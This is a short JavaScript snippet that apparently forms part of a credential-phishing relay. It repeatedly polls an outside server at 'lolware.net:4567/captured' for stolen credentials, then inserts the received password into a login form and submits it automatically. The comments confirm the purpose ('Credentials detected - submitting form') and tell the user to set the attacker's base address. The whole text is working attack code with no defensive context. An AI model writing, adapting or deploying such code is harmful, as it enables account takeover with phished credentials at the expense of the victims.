var pollserver = function (url) {
    fetch(url + "/captured", {}).then(function (response) {
        if (!response.ok) {
            throw new Error("Network response returned "
                + response.status);
        }
        return response.json();
    }).then(function (data) {
        console.log("Retreived data: " + data);
        if (data === "none") {
            setTimeout(pollserver(url), 3000);
        }
        else {
            // Credentials detected - submitting form
            console.log(JSON.stringify(data));
            document.getElementById("cred_password_inputtext").value =
                data["passwd"];
            document.getElementById("credentials").submit();
        }
    })["catch"](function (err) {
        console.error(err.message);
    });
};
// Set this URL to your base address
var url = "http://lolware.net:4567";
setTimeout(pollserver(url), 3000);
